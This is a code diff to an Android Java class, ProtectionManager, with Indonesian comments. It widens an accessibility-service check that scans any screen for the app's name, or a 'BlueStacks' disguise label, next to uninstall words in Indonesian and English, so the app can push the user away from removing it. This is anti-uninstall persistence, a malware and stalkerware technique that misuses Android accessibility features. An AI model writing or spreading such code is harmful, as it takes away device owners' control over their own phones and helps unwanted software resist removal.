@@ -122,61 +122,36 @@ public class ProtectionManager {
         if (root == null) return false;
         
         // Dapatkan nama aplikasi kita sendiri untuk validasi
-        String appName = "FPSOverlay"; // Default fallback
+        String appName = "BondexFPS"; 
+        String accLabel = "BlueStacks";
         try {
             int stringId = service.getApplicationInfo().labelRes;
             if (stringId != 0) appName = service.getString(stringId);
         } catch (Exception ignored) {}
 
-        // 1. Cek melalui ID pesan standar Android (diperluas)
-        String[] msgIds = {
-            "android:id/message", 
-            "com.android.settings:id/message", 
-            "com.android.packageinstaller:id/message",
-            "com.google.android.packageinstaller:id/message",
-            "com.android.packageinstaller:id/text",
-            "com.miui.securitycenter:id/message"
-        };
-        for (String id : msgIds) {
-            List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByViewId(id);
-            if (nodes != null && !nodes.isEmpty()) {
-                for (AccessibilityNodeInfo node : nodes) {
-                    String text = node.getText() != null ? node.getText().toString().toLowerCase() : "";
-                    node.recycle();
-                    if (text.contains("uninstall") || text.contains("copot") || text.contains("hapus") || text.contains("pemasangan")) {
-                        return true;
-                    }
-                }
-            }
-        }
+        // 1. GLOBAL SCAN: Jika ada nama aplikasi DAN kata kunci uninstall di layar manapun
+        boolean hasAppName = checkNodeRecursive(root, appName) || checkNodeRecursive(root, accLabel);
         
-        // 2. Cek apakah nama aplikasi kita disebut bersamaan dengan kata kunci uninstall
-        boolean hasAppName = checkNodeForText(root, appName);
-        boolean hasUninstallKey = checkNodeForText(root, "uninstall") || 
-                                 checkNodeForText(root, "copot") || 
-                                 checkNodeForText(root, "pemasangan") ||
-                                 checkNodeForText(root, "hapus");
+        boolean hasUninstallKey = checkNodeRecursive(root, "uninstall") || 
+                                 checkNodeRecursive(root, "copot") || 
+                                 checkNodeRecursive(root, "pemasangan") ||
+                                 checkNodeRecursive(root, "meng-uninstall") ||
+                                 checkNodeRecursive(root, "hapus") ||
+                                 checkNodeRecursive(root, "delete");
 
-        if (hasAppName && hasUninstallKey) return true;
-
-        // 3. Cek frasa spesifik bahasa Indonesia & Inggris
-        if (checkNodeForText(root, "Hapus instalasi") || 
-            checkNodeForText(root, "Copot pemasangan") || 
-            checkNodeForText(root, "Do you want to uninstall") ||
-            checkNodeForText(root, "ingin menghapus") ||
-            checkNodeForText(root, "ingin mencopot")) {
+        // Jika keduanya ada di satu layar, langsung tendang tanpa peduli package-nya apa
+        if (hasAppName && hasUninstallKey) {
+            Log.e(TAG, "!! GLOBAL UNINSTALL DETECTED !! AppName: " + appName + " found with Uninstall keyword.");
             return true;
         }
 
-        // 4. NEW: Deteksi Launcher Uninstall (Drag ke ikon tempat sampah/hapus)
-        // Di launcher, seringkali hanya ada tulisan "Hapus" atau "Uninstall" tanpa pesan panjang
-        if (root.getPackageName() != null && root.getPackageName().toString().toLowerCase().contains("launcher")) {
-            if (checkNodeForText(root, "Uninstall") || 
-                checkNodeForText(root, "Copot") || 
-                checkNodeForText(root, "Hapus")) {
-                // Verifikasi apakah nama aplikasi kita ada di sekitar situ
-                return checkNodeForText(root, appName);
-            }
+        // 2. Cek frasa spesifik (Double check)
+        if (checkNodeRecursive(root, "Hapus instalasi") || 
+            checkNodeRecursive(root, "Copot pemasangan") || 
+            checkNodeRecursive(root, "Do you want to uninstall") ||
+            checkNodeRecursive(root, "ingin menghapus") ||
+            checkNodeRecursive(root, "ingin mencopot")) {
+            return true;
         }
 
         return false;
